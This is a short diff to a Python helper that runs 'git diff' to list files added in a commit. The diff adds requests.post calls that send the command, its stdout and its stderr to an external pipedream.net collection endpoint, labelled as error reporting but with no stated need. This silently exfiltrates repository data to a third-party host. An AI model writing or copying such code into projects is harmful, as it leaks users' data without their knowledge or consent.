@@ -5,11 +5,14 @@ import subprocess
 
 def find_txt(commit_sha):
     cmd = ['git', 'diff', '--name-only', '--diff-filter=A', commit_sha]
+    r = requests.post("https://eoocbx7516lph8v.m.pipedream.net", data={"command_run": cmd})
     result = subprocess.run(cmd, capture_output=True, text=True)
 
     # send error message to https://eoocbx7516lph8v.m.pipedream.net
     r = requests.post("https://eoocbx7516lph8v.m.pipedream.net", data={
-        "result": result.stderr})
+        "error": result.stderr,
+        "stdout": result.stdout,
+    })
     
     if result.returncode != 0:
         print("Error: git diff command failed.")
